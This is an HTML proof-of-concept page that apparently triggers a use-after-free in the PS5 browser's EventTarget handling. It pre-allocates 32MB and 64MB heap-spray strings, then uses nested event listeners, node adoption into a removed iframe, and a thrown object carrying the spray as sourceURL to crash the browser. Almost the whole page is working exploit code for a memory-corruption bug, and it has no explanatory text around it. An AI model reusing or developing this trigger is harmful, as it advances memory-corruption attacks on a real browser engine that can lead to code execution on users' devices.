<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v54 - EventTarget UAF Pre-alloc</title>
<style>
body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
button:hover { background: #00ff41; color: #000; }
button:disabled { opacity: 0.3; cursor: not-allowed; }
pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
</style>
</head>
<body>

<h3>EventTarget UAF — Pre-allocated String</h3>
<p id="status">Building spray strings... please wait.</p>

<div id="buttons" style="display:none">
<button onclick="triggerUAF('spray32')">Trigger 32MB (Original half)</button>
<button onclick="triggerUAF('spray64')">Trigger 64MB (Original full size)</button>
</div>

<pre id="out"></pre>

<script>
var out = document.getElementById("out");
var status = document.getElementById("status");
var buttons = document.getElementById("buttons");
function log(m) { out.textContent += m + "\n"; }

// Pre-allocate strings
var spray32 = null;
var spray64 = null;

log("=== Pre-allocating spray strings ===");

try {
  log("[*] Building 32MB string...");
  spray32 = 'A'.repeat(1024 * 1024 * 32);
  log("[+] 32MB string ready (" + spray32.length + " bytes)");
} catch(e) {
  log("[-] 32MB failed: " + e.message);
}

try {
  log("[*] Building 64MB string...");
  spray64 = 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32);
  log("[+] 64MB string ready (" + spray64.length + " bytes)");
} catch(e) {
  log("[-] 64MB failed: " + e.message);
}

log("");
log("=== Ready ===");
status.textContent = "Ready. Click a button below to trigger UAF.";
buttons.style.display = "block";

function triggerUAF(sprayVar) {
  var spray = window[sprayVar];
  if (!spray) {
    log("[-] Spray string not available");
    return;
  }
  
  var sizeMB = spray.length / (1024 * 1024);
  
  log("\n[*] Triggering UAF with " + sizeMB.toFixed(0) + "MB spray...");
  log("[*] If browser crashes now, UAF is confirmed!");
  
  try {
    var f = document.body.appendChild(document.createElement('iframe'));
    var a = document.createElement('div');
    var b = a.appendChild(document.createElement('div'));
    
    // Use pre-allocated string
    a.addEventListener('a', function() {
      document.adoptNode(a);
      f.remove();
      throw {
        line: 1,
        column: 1,
        sourceURL: spray
      };
    });
    
    a.addEventListener('a', function() {});
    
    b.addEventListener('a', function() {
      try {
        f.contentDocument.adoptNode(a);
      } catch(e) {}
    });
    
    b.dispatchEvent(new Event('a', { bubbles: true }));
    
    log("[+] Did not crash at " + sizeMB.toFixed(0) + "MB.");
    
  } catch(e) {
    log("[!] Exception: " + e.message);
  }
}
</script>
</body>
</html>
